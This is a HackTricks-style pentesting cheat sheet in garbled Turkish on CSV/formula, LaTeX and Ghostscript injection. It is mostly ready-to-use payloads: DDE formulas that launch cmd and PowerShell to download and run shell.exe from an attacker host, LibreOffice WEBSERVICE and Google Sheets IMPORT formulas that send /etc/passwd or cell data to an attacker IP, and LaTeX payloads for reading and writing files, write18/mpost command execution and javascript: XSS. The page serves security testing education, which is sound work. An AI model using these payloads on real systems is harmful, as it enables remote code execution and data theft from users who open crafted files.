# Formula/CSV/Doc/LaTeX/GhostScript Injection

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Formula Injection

### Bilgi

EÄŸer **girdi** **CSV dosyasÄ±** (veya muhtemelen **Excel** tarafÄ±ndan aÃ§Ä±lacak baÅŸka bir dosya) iÃ§inde **yansÄ±tÄ±lÄ±yorsa**, kullanÄ±cÄ± dosyayÄ± **aÃ§tÄ±ÄŸÄ±nda** veya kullanÄ±cÄ± excel sayfasÄ±ndaki bazÄ± **baÄŸlantÄ±lara tÄ±kladÄ±ÄŸÄ±nda** **Ã§alÄ±ÅŸtÄ±rÄ±lacak** Excel **formÃ¼lleri** ekleyebilirsiniz.

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde **Excel, dÄ±ÅŸarÄ±dan bir ÅŸey yÃ¼klendiÄŸinde** (birkaÃ§ kez) **kullanÄ±cÄ±yÄ± uyaracaktÄ±r**; bu, kÃ¶tÃ¼ niyetli eylemleri Ã¶nlemek iÃ§indir. Bu nedenle, son yÃ¼k Ã¼zerinde Sosyal MÃ¼hendislik konusunda Ã¶zel bir Ã§aba sarf edilmelidir.
{% endhint %}

### [Kelimeler Listesi](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hyperlink

**AÅŸaÄŸÄ±daki Ã¶rnek, son excel sayfasÄ±ndan iÃ§erik Ã§Ä±karmak ve rastgele konumlara istekler yapmak iÃ§in Ã§ok faydalÄ±dÄ±r. Ancak, kullanÄ±cÄ±nÄ±n baÄŸlantÄ±ya tÄ±klamasÄ± (ve uyarÄ± istemlerini kabul etmesi) gerekmektedir.**

AÅŸaÄŸÄ±daki Ã¶rnek [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit) adresinden alÄ±nmÄ±ÅŸtÄ±r.

Bir Ã–ÄŸrenci KayÄ±t YÃ¶netim sisteminde bir gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n CSV enjeksiyon saldÄ±rÄ±sÄ± ile istismar edildiÄŸini hayal edin. SaldÄ±rganÄ±n temel amacÄ±, Ã¶ÄŸretmenlerin Ã¶ÄŸrenci bilgilerini yÃ¶netmek iÃ§in kullandÄ±ÄŸÄ± sistemi tehlikeye atmaktÄ±r. YÃ¶ntem, saldÄ±rganÄ±n uygulamaya kÃ¶tÃ¼ niyetli bir yÃ¼k enjekte etmesini iÃ§erir; Ã¶zellikle Ã¶ÄŸrenci bilgileri iÃ§in tasarlanmÄ±ÅŸ alanlara zararlÄ± formÃ¼ller girerek. SaldÄ±rÄ± ÅŸu ÅŸekilde geliÅŸir:

1. **KÃ¶tÃ¼ Niyetli YÃ¼kÃ¼n Enjeksiyonu:**
* SaldÄ±rgan, bir Ã¶ÄŸrenci detay formu gÃ¶nderir ancak genellikle elektronik tablolarÄ±nda kullanÄ±lan bir formÃ¼l ekler (Ã¶rneÄŸin, `=HYPERLINK("<malicious_link>","Click here")`).
* Bu formÃ¼l, bir hiperlink oluÅŸturmak iÃ§in tasarlanmÄ±ÅŸtÄ±r, ancak saldÄ±rgan tarafÄ±ndan kontrol edilen kÃ¶tÃ¼ niyetli bir sunucuya iÅŸaret eder.
2. **Tehdit AltÄ±ndaki Verilerin DÄ±ÅŸa AktarÄ±lmasÄ±:**
* Ã–ÄŸretmenler, tehlikeden habersiz, verileri bir CSV dosyasÄ±na dÄ±ÅŸa aktarmak iÃ§in uygulamanÄ±n iÅŸlevselliÄŸini kullanÄ±r.
* CSV dosyasÄ± aÃ§Ä±ldÄ±ÄŸÄ±nda, hala kÃ¶tÃ¼ niyetli yÃ¼kÃ¼ iÃ§erir. Bu yÃ¼k, elektronik tabloda tÄ±klanabilir bir hiperlink olarak gÃ¶rÃ¼nÃ¼r.
3. **SaldÄ±rÄ±nÄ±n Tetiklenmesi:**
* Bir Ã¶ÄŸretmen, Ã¶ÄŸrencinin detaylarÄ±nÄ±n meÅŸru bir parÃ§asÄ± olduÄŸunu dÃ¼ÅŸÃ¼nerek hiperlinke tÄ±klar.
* TÄ±kladÄ±ÄŸÄ±nda, hassas veriler (potansiyel olarak elektronik tablodan veya Ã¶ÄŸretmenin bilgisayarÄ±ndan gelen detaylar) saldÄ±rganÄ±n sunucusuna iletilir.
4. **Verilerin Kaydedilmesi:**
* SaldÄ±rganÄ±n sunucusu, Ã¶ÄŸretmenin bilgisayarÄ±ndan gÃ¶nderilen hassas verileri alÄ±r ve kaydeder.
* SaldÄ±rgan, bu verileri Ã§eÅŸitli kÃ¶tÃ¼ niyetli amaÃ§lar iÃ§in kullanabilir, bÃ¶ylece Ã¶ÄŸrencilerin ve kurumun gizliliÄŸi ve gÃ¼venliÄŸi daha da tehlikeye girmiÅŸ olur.

### RCE

**Daha fazla ayrÄ±ntÄ± iÃ§in** [**orijinal gÃ¶nderiyi**](https://notsosecure.com/data-exfiltration-formula-injection-part1) **kontrol edin.**

Belirli yapÄ±landÄ±rmalarda veya eski Excel sÃ¼rÃ¼mlerinde, Dinamik Veri DeÄŸiÅŸimi (DDE) adÄ± verilen bir Ã¶zellik, rastgele komutlar Ã§alÄ±ÅŸtÄ±rmak iÃ§in istismar edilebilir. Bunu kullanmak iÃ§in aÅŸaÄŸÄ±daki ayarlarÄ±n etkinleÅŸtirilmesi gerekir:

* Dosya â†’ SeÃ§enekler â†’ GÃ¼ven Merkezi â†’ GÃ¼ven Merkezi AyarlarÄ± â†’ Harici Ä°Ã§erik'e gidin ve **Dinamik Veri DeÄŸiÅŸimi Sunucu BaÅŸlatma** seÃ§eneÄŸini etkinleÅŸtirin.

KÃ¶tÃ¼ niyetli yÃ¼kÃ¼ iÃ§eren bir elektronik tablo aÃ§Ä±ldÄ±ÄŸÄ±nda (ve kullanÄ±cÄ± uyarÄ±larÄ± kabul ederse), yÃ¼k Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. Ã–rneÄŸin, hesap makinesi uygulamasÄ±nÄ± baÅŸlatmak iÃ§in yÃ¼k ÅŸÃ¶yle olur:
```markdown
=cmd|' /C calc'!xxx
```
Ek komutlar da Ã§alÄ±ÅŸtÄ±rÄ±labilir, Ã¶rneÄŸin bir dosyayÄ± PowerShell kullanarak indirmek ve Ã§alÄ±ÅŸtÄ±rmak:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Local File Inclusion (LFI) in LibreOffice Calc

LibreOffice Calc, yerel dosyalarÄ± okumak ve verileri dÄ±ÅŸarÄ±ya sÄ±zdÄ±rmak iÃ§in kullanÄ±labilir. Ä°ÅŸte bazÄ± yÃ¶ntemler:

* Yerel `/etc/passwd` dosyasÄ±nÄ±n ilk satÄ±rÄ±nÄ± okuma: `='file:///etc/passwd'#$passwd.A1`
* Okunan verileri saldÄ±rgan kontrolÃ¼ndeki bir sunucuya dÄ±ÅŸarÄ±ya sÄ±zdÄ±rma: `=WEBSERVICE(CONCATENATE("http://<saldÄ±rgan IP>:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Birden fazla satÄ±rÄ± dÄ±ÅŸarÄ±ya sÄ±zdÄ±rma: `=WEBSERVICE(CONCATENATE("http://<saldÄ±rgan IP>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* DNS dÄ±ÅŸarÄ±ya sÄ±zdÄ±rma (okunan verileri saldÄ±rgan kontrolÃ¼ndeki bir DNS sunucusuna DNS sorgularÄ± olarak gÃ¶nderme): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<saldÄ±rgan alan adÄ±>"))`

### Google Sheets for Out-of-Band (OOB) Data Exfiltration

Google Sheets, OOB veri dÄ±ÅŸarÄ±ya sÄ±zdÄ±rma iÃ§in istismar edilebilecek iÅŸlevler sunar:

* **CONCATENATE**: Dize birleÅŸtirir - `=CONCATENATE(A2:E2)`
* **IMPORTXML**: YapÄ±landÄ±rÄ±lmÄ±ÅŸ veri tÃ¼rlerinden veri alÄ±r - `=IMPORTXML(CONCAT("http://<saldÄ±rgan IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
* **IMPORTFEED**: RSS veya ATOM beslemelerini alÄ±r - `=IMPORTFEED(CONCAT("http://<saldÄ±rgan IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
* **IMPORTHTML**: HTML tablolarÄ±ndan veya listelerinden veri alÄ±r - `=IMPORTHTML (CONCAT("http://<saldÄ±rgan IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
* **IMPORTRANGE**: BaÅŸka bir elektronik tablodan bir hÃ¼cre aralÄ±ÄŸÄ±nÄ± alÄ±r - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
* **IMAGE**: Bir hÃ¼creye resim ekler - `=IMAGE("https://<saldÄ±rgan IP:Port>/images/srpr/logo3w.png")`

## LaTeX Injection

Genellikle internette bulunan ve **LaTeX kodunu PDF'ye dÃ¶nÃ¼ÅŸtÃ¼ren** sunucular **`pdflatex`** kullanÄ±r.\
Bu program, komut yÃ¼rÃ¼tmeyi (izin vermek veya vermemek iÃ§in) 3 ana Ã¶zellik kullanÄ±r:

* **`--no-shell-escape`**: `\write18{command}` yapÄ±sÄ±nÄ± **devre dÄ±ÅŸÄ± bÄ±rakÄ±r**, texmf.cnf dosyasÄ±nda etkin olsa bile.
* **`--shell-restricted`**: `--shell-escape` ile aynÄ±, ancak **Ã¶nceden tanÄ±mlanmÄ±ÅŸ** 'gÃ¼venli' bir komut seti ile **sÄ±nÄ±rlÄ±dÄ±r** (\*\*Ubuntu 16.04'te liste `/usr/share/texmf/web2c/texmf.cnf` iÃ§indedir).
* **`--shell-escape`**: `\write18{command}` yapÄ±sÄ±nÄ± **etkinleÅŸtirir**. Komut herhangi bir shell komutu olabilir. Bu yapÄ± genellikle gÃ¼venlik nedenleriyle yasaktÄ±r.

Ancak, komutlarÄ± yÃ¼rÃ¼tmenin baÅŸka yollarÄ± da vardÄ±r, bu nedenle RCE'yi Ã¶nlemek iÃ§in `--shell-restricted` kullanmak Ã§ok Ã¶nemlidir.

### Read file <a href="#read-file" id="read-file"></a>

Enjeksiyonu \[ veya $ gibi sarmalayÄ±cÄ±larla ayarlamanÄ±z gerekebilir.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Tek satÄ±rlÄ±k dosyayÄ± oku
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Ã‡ok satÄ±rlÄ± dosyayÄ± oku
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Dosya yaz <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Komut yÃ¼rÃ¼tme <a href="#command-execution" id="command-execution"></a>

Komutun giriÅŸi stdin'e yÃ¶nlendirilecektir, bunu almak iÃ§in geÃ§ici bir dosya kullanÄ±n.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
EÄŸer herhangi bir LaTex hatasÄ± alÄ±rsanÄ±z, kÃ¶tÃ¼ karakterler olmadan sonucu almak iÃ§in base64 kullanmayÄ± dÃ¼ÅŸÃ¼nÃ¼n.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

[@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130) tarafÄ±ndan
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript Injection

**Kontrol Et** [**https://blog.redteam-pentesting.de/2023/ghostscript-overview/**](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## Referanslar

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)


{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
